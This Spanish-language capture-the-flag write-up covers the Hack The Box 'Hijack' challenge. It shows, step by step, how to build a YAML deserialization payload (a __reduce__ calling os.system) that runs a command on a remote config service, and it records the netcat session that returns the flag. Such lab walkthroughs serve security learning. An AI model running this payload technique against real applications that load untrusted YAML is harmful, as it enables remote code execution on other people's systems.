# Hijack

En la instancia remota vemos un menú para crear y cargar archivos de configuración

```
$ nc 165.232.108.240 31949

<------[TCS]------>
[1] Create config
[2] Load config
[3] Exit
> 1

- Creating new config -
Temperature units (F/C/K): F
Propulsion Components Target Temperature : 100
Solar Array Target Temperature : 500
Infrared Spectrometers Target Temperature : 600
Auto Calibration (ON/OFF) : ON

Serialized config: ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6ICc2MDAnLCBhdXRvX2NhbGlicmF0aW9uOiAnT04nLAogIHByb3B1bHNpb25fdGVtcDogJzEwMCcsIHNvbGFyX2FycmF5X3RlbXA6ICc1MDAnLCB1bml0czogRn0K
Uploading to ship...


<------[TCS]------>
[1] Create config
[2] Load config
[3] Exit
> 2

Serialized config to load: ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6ICc2MDAnLCBhdXRvX2NhbGlicmF0aW9uOiAnT04nLAogIHByb3B1bHNpb25fdGVtcDogJzEwMCcsIHNvbGFyX2FycmF5X3RlbXA6ICc1MDAnLCB1bml0czogRn0K

Unable to load config!
```

En el menú aparece `serialized config` y automaticamente pensamos en un ataque de serialización, decodifiquemos el archivo de configuración en base 64

```python
>>> import base64
>>> import pickle
>>> import pickletools
>>> config = 'ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6ICc2MDAnLCBhdXRvX2NhbGlicmF0aW9uOiAnT04nLAogIHByb3B1bHNpb25fdGVtcDogJzEwMCcsIHNvbGFyX2FycmF5X3RlbXA6ICc1MDAnLCB1bml0czogRn0K'
>>> base64.b64decode(config)
b"!!python/object:__main__.Config {IR_spectrometer_temp: '600', auto_calibration: 'ON',\n  propulsion_temp: '100', solar_array_temp: '500', units: F}\n"
```

Si alguna vez han hecho ataques de serialización se daran cuenta que este formato no parece la serialización oficial de python (pickle). De hecho si intentamos analizar este resultado usando `pickletools` arrojará un error

```python
>>> pickled = base64.b64decode(config)
>>> pickletools.dis(pickled)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib64/python3.11/pickletools.py", line 2448, in dis
    for opcode, arg, pos in genops(pickle):
  File "/usr/lib64/python3.11/pickletools.py", line 2285, in _genops
    raise ValueError("at position %s, opcode %r unknown" % (
ValueError: at position 0, opcode b'!' unknown
```

Realizando una busqueda de `!!python/object` nos encontramos con este [artículo](https://code.tutsplus.com/tutorials/serialization-and-deserialization-of-python-objects-part-2--cms-26184) que trata de serialización de python usando yaml.

Al igual que con los ataques de serialización pickle empezamos a construir el payload tomando como base un script que ejecute un comando al momento en el que ocurre la deserialización, de acuerdo con el ejemplo mostrado [aquí](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

```python
import pickle
import base64
import os


class Config:
    def __reduce__(self):
        cmd = ('cat flag.txt')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

Ahora el único cambio es utilizar yaml en vez de pickle y el script se verá de esta forma

```python
import pickle
import base64
import os
import yaml


class Config:
    def __reduce__(self):
        cmd = ('cat flag.txt')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = yaml.dump(Config())
    print(base64.urlsafe_b64encode(str.encode(pickled)))
```

El script imprime `ISFweXRob24vb2JqZWN0L2FwcGx5OnBvc2l4LnN5c3RlbQotIGNhdCBmbGFnLnR4dAo=` y ya podemos cargarlo en el menú

```
$ nc 165.232.108.240 31949

<------[TCS]------>
[1] Create config
[2] Load config
[3] Exit
> 2

Serialized config to load: ISFweXRob24vb2JqZWN0L2FwcGx5OnBvc2l4LnN5c3RlbQotIGNhdCBmbGFnLnR4dAo=
HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}
** Success **
Uploading to ship...

<------[TCS]------>
[1] Create config
[2] Load config
[3] Exit

```

flag `HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}`
